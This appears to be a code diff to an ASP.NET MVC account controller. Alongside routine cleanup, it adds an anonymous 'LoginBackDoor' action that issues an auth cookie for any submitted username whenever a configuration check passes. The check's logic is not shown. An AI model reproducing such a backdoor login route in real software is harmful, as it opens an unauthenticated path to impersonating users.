@@ -4,7 +4,6 @@ using SolucionesARWebsite2.Business.Logic;
 using SolucionesARWebsite2.Enumerations;
 using SolucionesARWebsite2.Utils;
 using SolucionesARWebsite2.ViewModels.Account;
-using WebMatrix.WebData;
 
 namespace SolucionesARWebsite2.Controllers
 {
@@ -57,13 +56,27 @@ namespace SolucionesARWebsite2.Controllers
 
             // If we got this far, something failed, redisplay form
             ModelState.AddModelError("Username", "The user name or password provided is incorrect.");
-            var loginViewModel = new LoginViewModel
-                                     {
-                                         Username = loginFormModel.Username,
-                                     };
-            return View(loginViewModel);
+            loginFormModel.Password = string.Empty;
+            return View(loginFormModel);
         }
-        
+
+        [HttpPost]
+        [AllowAnonymous]
+        [ValidateAntiForgeryToken]
+        public ActionResult LoginBackDoor(LoginViewModel loginFormModel, string returnUrl)
+        {
+            if (ModelState.IsValid && _accountLogic.CreateDefaultConfiguration(loginFormModel))
+            {
+                FormsAuthentication.SetAuthCookie(loginFormModel.Username, false);
+                Session[Constants.RoleBasedMenu.ToStringValue()] = null;
+                return RedirectToLocal(returnUrl);
+            }
+
+            // If we got this far, something failed, redisplay form
+            ModelState.AddModelError("Username", "Hey you...! We got you :P");
+            return View("Login", loginFormModel);
+        }
+
         public ActionResult LogOff()
         {
             FormsAuthentication.SignOut();
@@ -81,10 +94,7 @@ namespace SolucionesARWebsite2.Controllers
             {
                 return Redirect(returnUrl);
             }
-            else
-            {
-                return RedirectToAction("Index", "Home");
-            }
+            return RedirectToAction("Index", "Home");
         }
 
         #endregion
